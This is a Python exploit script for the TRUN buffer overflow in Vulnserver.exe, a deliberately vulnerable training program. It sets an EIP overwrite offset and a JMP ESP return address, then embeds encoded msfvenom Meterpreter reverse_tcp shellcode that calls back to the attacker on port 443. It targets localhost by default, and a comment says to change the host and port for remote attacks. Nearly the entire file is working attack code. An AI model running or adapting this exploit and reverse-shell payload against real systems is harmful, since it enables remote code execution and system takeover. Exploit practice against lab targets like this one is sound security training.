import socket
import struct

'''
    +-------------------------------------------------------+
    | *** TRUN exploit for Vulnserver.exe ***               |
    | EIP offset: 2003                                      |
    | JMP ESP Address: 0x625011af                           |
    +-------------------------------------------------------+
'''


def main():

    eip_offset = 2003
    tot_len = 5013
    pre = "TRUN /.:/"
    junk1 = "A" * eip_offset
    eip = struct.pack('<I', 0x625011af)

    # SUB ESP, 0x1C
    # Need to give FSTENV something to chew through - jumps
    # up the stack by 28 bytes.
    # Note: using an odd number of bytes to jump back here
    # will cause misalignment and just crash the thread.
    stack_align = "\x83\xEC\x1C"

    '''
        +-------------------------------------------------------+
        | SHELLCODE GENERATION:                                 |
        | msfvenom -p windows/meterpreter/reverse_tcp           |
        |   \ LHOST=eth1 LPORT=443 -f python -e x86/alpha_mixed |
        |   \ -v sc                                             |
        +-------------------------------------------------------+
    '''
    sc = b""
    sc += b"\x89\xe2\xda\xdf\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49"
    sc += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
    sc += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
    sc += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
    sc += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x6a\x48\x6e"
    sc += b"\x62\x45\x50\x57\x70\x35\x50\x35\x30\x4f\x79\x68\x65"
    sc += b"\x66\x51\x69\x50\x51\x74\x4e\x6b\x46\x30\x50\x30\x4e"
    sc += b"\x6b\x62\x72\x76\x6c\x4e\x6b\x76\x32\x74\x54\x6e\x6b"
    sc += b"\x61\x62\x56\x48\x46\x6f\x58\x37\x61\x5a\x76\x46\x65"
    sc += b"\x61\x59\x6f\x4e\x4c\x55\x6c\x55\x31\x43\x4c\x44\x42"
    sc += b"\x66\x4c\x65\x70\x6b\x71\x7a\x6f\x36\x6d\x36\x61\x6f"
    sc += b"\x37\x59\x72\x59\x62\x33\x62\x76\x37\x4c\x4b\x50\x52"
    sc += b"\x42\x30\x4e\x6b\x51\x5a\x55\x6c\x6c\x4b\x70\x4c\x47"
    sc += b"\x61\x70\x78\x69\x73\x31\x58\x67\x71\x4a\x71\x62\x71"
    sc += b"\x4c\x4b\x52\x79\x37\x50\x43\x31\x69\x43\x4e\x6b\x51"
    sc += b"\x59\x47\x68\x6a\x43\x77\x4a\x51\x59\x6e\x6b\x35\x64"
    sc += b"\x4e\x6b\x53\x31\x59\x46\x30\x31\x39\x6f\x4e\x4c\x5a"
    sc += b"\x61\x78\x4f\x44\x4d\x57\x71\x4b\x77\x45\x68\x4b\x50"
    sc += b"\x44\x35\x5a\x56\x34\x43\x73\x4d\x68\x78\x57\x4b\x61"
    sc += b"\x6d\x51\x34\x32\x55\x58\x64\x52\x78\x4e\x6b\x43\x68"
    sc += b"\x45\x74\x76\x61\x59\x43\x65\x36\x6c\x4b\x76\x6c\x42"
    sc += b"\x6b\x4c\x4b\x61\x48\x57\x6c\x66\x61\x48\x53\x4c\x4b"
    sc += b"\x64\x44\x4e\x6b\x76\x61\x68\x50\x6c\x49\x30\x44\x45"
    sc += b"\x74\x57\x54\x73\x6b\x73\x6b\x43\x51\x72\x79\x73\x6a"
    sc += b"\x32\x71\x6b\x4f\x6d\x30\x71\x4f\x31\x4f\x53\x6a\x4c"
    sc += b"\x4b\x52\x32\x68\x6b\x6e\x6d\x73\x6d\x62\x48\x67\x43"
    sc += b"\x50\x32\x57\x70\x73\x30\x51\x78\x62\x57\x64\x33\x54"
    sc += b"\x72\x51\x4f\x30\x54\x71\x78\x72\x6c\x31\x67\x61\x36"
    sc += b"\x46\x67\x6e\x69\x68\x68\x69\x6f\x68\x50\x58\x38\x6a"
    sc += b"\x30\x47\x71\x75\x50\x43\x30\x54\x69\x6f\x34\x76\x34"
    sc += b"\x42\x70\x35\x38\x56\x49\x4f\x70\x62\x4b\x67\x70\x79"
    sc += b"\x6f\x59\x45\x63\x5a\x66\x6a\x65\x38\x6f\x30\x4d\x78"
    sc += b"\x58\x48\x4e\x61\x55\x38\x56\x62\x33\x30\x55\x51\x6f"
    sc += b"\x4b\x4f\x79\x39\x76\x66\x30\x52\x70\x62\x70\x62\x70"
    sc += b"\x57\x30\x70\x50\x71\x50\x42\x70\x43\x58\x78\x6a\x66"
    sc += b"\x6f\x59\x4f\x69\x70\x59\x6f\x38\x55\x6f\x67\x52\x4a"
    sc += b"\x34\x50\x46\x36\x56\x37\x33\x58\x6c\x59\x49\x35\x30"
    sc += b"\x74\x50\x61\x49\x6f\x39\x45\x4c\x45\x39\x50\x33\x44"
    sc += b"\x67\x7a\x59\x6f\x72\x6e\x73\x38\x62\x55\x58\x6c\x78"
    sc += b"\x68\x63\x57\x67\x70\x75\x50\x53\x30\x63\x5a\x43\x30"
    sc += b"\x73\x5a\x33\x34\x66\x36\x43\x67\x71\x78\x56\x62\x4e"
    sc += b"\x39\x48\x48\x63\x6f\x39\x6f\x39\x45\x6c\x43\x49\x68"
    sc += b"\x35\x50\x33\x4e\x30\x36\x4c\x4b\x67\x46\x33\x5a\x71"
    sc += b"\x50\x75\x38\x73\x30\x42\x30\x75\x50\x73\x30\x72\x76"
    sc += b"\x43\x5a\x65\x50\x70\x68\x72\x78\x79\x34\x43\x63\x5a"
    sc += b"\x45\x39\x6f\x48\x55\x6e\x73\x61\x43\x42\x4a\x73\x30"
    sc += b"\x30\x56\x70\x53\x31\x47\x62\x48\x44\x42\x59\x49\x78"
    sc += b"\x48\x43\x6f\x69\x6f\x4b\x65\x6f\x73\x6b\x48\x37\x70"
    sc += b"\x53\x4d\x75\x78\x73\x68\x71\x78\x47\x70\x63\x70\x45"
    sc += b"\x50\x45\x50\x72\x4a\x55\x50\x70\x50\x71\x78\x66\x6b"
    sc += b"\x46\x4f\x76\x6f\x66\x50\x49\x6f\x4e\x35\x71\x47\x53"
    sc += b"\x58\x62\x55\x52\x4e\x70\x4d\x63\x51\x6b\x4f\x39\x45"
    sc += b"\x43\x6e\x53\x6e\x69\x6f\x36\x6c\x66\x44\x76\x6f\x6d"
    sc += b"\x55\x74\x30\x59\x6f\x4b\x4f\x79\x6f\x4d\x39\x6d\x4b"
    sc += b"\x4b\x4f\x4b\x4f\x39\x6f\x45\x51\x69\x53\x65\x79\x59"
    sc += b"\x56\x54\x35\x69\x51\x69\x53\x6d\x6b\x78\x70\x4c\x75"
    sc += b"\x39\x32\x70\x56\x73\x5a\x33\x30\x61\x43\x39\x6f\x39"
    sc += b"\x45\x41\x41"

    junk2 = "D" * (tot_len - len(junk1) - len(eip) - len(sc))
    buf = pre + junk1 + eip + stack_align + sc + junk2

    # Change these for remote attacks.
    host = "127.0.0.1"
    port = 9999

    # Connect and send the payload.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print(s.recv(10000))
    s.send(buf)
    print(s.recv(10000))
    s.close()


if __name__ == "__main__":
    main()

